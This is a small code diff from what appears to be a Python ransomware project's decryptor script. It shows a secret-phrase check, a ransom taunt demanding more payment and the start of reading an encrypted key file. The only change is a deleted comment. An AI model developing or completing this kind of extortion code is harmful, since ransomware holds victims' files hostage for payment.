@@ -19,7 +19,6 @@ enteredPhrase = input("Enter valid phrase to decrypt the files\n")
 if (secretPhrase != enteredPhrase):
     print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
 else:
-    # Add try except block to handle the exceptions.
     try:
         with open("encryptedKey.key", "rb") as encryptedKey:
             secretKey = encryptedKey.read()
